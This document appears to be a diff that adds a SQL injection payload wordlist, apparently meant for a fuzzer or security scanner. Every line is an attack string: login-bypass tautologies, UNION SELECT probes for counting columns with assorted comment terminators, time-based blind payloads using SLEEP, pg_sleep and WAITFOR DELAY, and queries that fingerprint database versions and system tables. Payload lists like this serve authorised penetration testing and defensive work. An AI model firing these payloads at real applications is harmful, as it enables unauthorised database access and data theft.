+'
+OR
+1=1--
+'	OR	1=1--
+' UNION SELECT 1 --
+' UNION ALL SELECT 1 --
+' UNION SELECT 1 FROM users --
+' UNION SELECT 1 -- -
+' UNION ALL SELECT 1 -- -
+' UNION SELECT 1 FROM users -- -
+' UNION SELECT 1 #
+' UNION ALL SELECT 1 #
+' UNION SELECT 1 FROM users #
+' UNION SELECT 1 ;%00
+' UNION ALL SELECT 1 ;%00
+' UNION SELECT 1 FROM users ;%00
+' UNION SELECT 1 /*
+' UNION ALL SELECT 1 /*
+' UNION SELECT 1 FROM users /*
+' UNION SELECT 1 /**/
+' UNION ALL SELECT 1 /**/
+' UNION SELECT 1 FROM users /**/
+' UNION SELECT 1
+' UNION ALL SELECT 1
+' UNION SELECT 1 FROM users
+' UNION SELECT 1,2 --
+' UNION ALL SELECT 1,2 --
+' UNION SELECT 1,2 FROM users --
+' UNION SELECT 1,2 -- -
+' UNION ALL SELECT 1,2 -- -
+' UNION SELECT 1,2 FROM users -- -
+' UNION SELECT 1,2 #
+' UNION ALL SELECT 1,2 #
+' UNION SELECT 1,2 FROM users #
+' UNION SELECT 1,2 ;%00
+' UNION ALL SELECT 1,2 ;%00
+' UNION SELECT 1,2 FROM users ;%00
+' UNION SELECT 1,2 /*
+' UNION ALL SELECT 1,2 /*
+' UNION SELECT 1,2 FROM users /*
+' UNION SELECT 1,2 /**/
+' UNION ALL SELECT 1,2 /**/
+' UNION SELECT 1,2 FROM users /**/
+' UNION SELECT 1,2
+' UNION ALL SELECT 1,2
+' UNION SELECT 1,2 FROM users
+' UNION SELECT 1,2,3 --
+' UNION ALL SELECT 1,2,3 --
+' UNION SELECT 1,2,3 FROM users --
+' UNION SELECT 1,2,3 -- -
+' UNION ALL SELECT 1,2,3 -- -
+' UNION SELECT 1,2,3 FROM users -- -
+' UNION SELECT 1,2,3 #
+' UNION ALL SELECT 1,2,3 #
+' UNION SELECT 1,2,3 FROM users #
+' UNION SELECT 1,2,3 ;%00
+' UNION ALL SELECT 1,2,3 ;%00
+' UNION SELECT 1,2,3 FROM users ;%00
+' UNION SELECT 1,2,3 /*
+' UNION ALL SELECT 1,2,3 /*
+' UNION SELECT 1,2,3 FROM users /*
+' UNION SELECT 1,2,3 /**/
+' UNION ALL SELECT 1,2,3 /**/
+' UNION SELECT 1,2,3 FROM users /**/
+' UNION SELECT 1,2,3
+' UNION ALL SELECT 1,2,3
+' UNION SELECT 1,2,3 FROM users
+' UNION SELECT 1,2,3,4 --
+' UNION ALL SELECT 1,2,3,4 --
+' UNION SELECT 1,2,3,4 FROM users --
+' UNION SELECT 1,2,3,4 -- -
+' UNION ALL SELECT 1,2,3,4 -- -
+' UNION SELECT 1,2,3,4 FROM users -- -
+' UNION SELECT 1,2,3,4 #
+' UNION ALL SELECT 1,2,3,4 #
+' UNION SELECT 1,2,3,4 FROM users #
+' UNION SELECT 1,2,3,4 ;%00
+' UNION ALL SELECT 1,2,3,4 ;%00
+' UNION SELECT 1,2,3,4 FROM users ;%00
+' UNION SELECT 1,2,3,4 /*
+' UNION ALL SELECT 1,2,3,4 /*
+' UNION SELECT 1,2,3,4 FROM users /*
+' UNION SELECT 1,2,3,4 /**/
+' UNION ALL SELECT 1,2,3,4 /**/
+' UNION SELECT 1,2,3,4 FROM users /**/
+' UNION SELECT 1,2,3,4
+' UNION ALL SELECT 1,2,3,4
+' UNION SELECT 1,2,3,4 FROM users
+' UNION SELECT 1,2,3,4,5 --
+' UNION ALL SELECT 1,2,3,4,5 --
+' UNION SELECT 1,2,3,4,5 FROM users --
+' UNION SELECT 1,2,3,4,5 -- -
+' UNION ALL SELECT 1,2,3,4,5 -- -
+' UNION SELECT 1,2,3,4,5 FROM users -- -
+' UNION SELECT 1,2,3,4,5 #
+' UNION ALL SELECT 1,2,3,4,5 #
+' UNION SELECT 1,2,3,4,5 FROM users #
+' UNION SELECT 1,2,3,4,5 ;%00
+' UNION ALL SELECT 1,2,3,4,5 ;%00
+' UNION SELECT 1,2,3,4,5 FROM users ;%00
+' UNION SELECT 1,2,3,4,5 /*
+' UNION ALL SELECT 1,2,3,4,5 /*
+' UNION SELECT 1,2,3,4,5 FROM users /*
+' UNION SELECT 1,2,3,4,5 /**/
+' UNION ALL SELECT 1,2,3,4,5 /**/
+' UNION SELECT 1,2,3,4,5 FROM users /**/
+' UNION SELECT 1,2,3,4,5
+' UNION ALL SELECT 1,2,3,4,5
+' UNION SELECT 1,2,3,4,5 FROM users
+' OR SLEEP(1)--
+' OR pg_sleep(1)--
+' OR WAITFOR DELAY '0:0:1'--
+' AND SLEEP(1)--
+' OR WAITFOR DELAY '0:0:2'--
+' OR SLEEP(3)--
+' OR pg_sleep(3)--
+' OR WAITFOR DELAY '0:0:3'--
+' AND SLEEP(3)--
+' OR WAITFOR DELAY '0:0:5'--
+' OR SLEEP(7)--
+' OR pg_sleep(7)--
+' OR WAITFOR DELAY '0:0:7'--
+' AND SLEEP(7)--
+' OR SLEEP(10)--
+' OR pg_sleep(10)--
+' OR WAITFOR DELAY '0:0:10'--
+' AND SLEEP(10)--
+' OR ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))>64--
+' OR EXISTS(SELECT * FROM sysservers WHERE name IS NOT NULL)--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' OR (SELECT @@version) LIKE '%Microsoft%--
+' OR (SELECT @@version) LIKE '%PostgreSQL%--
+' OR (SELECT user())='postgres'--
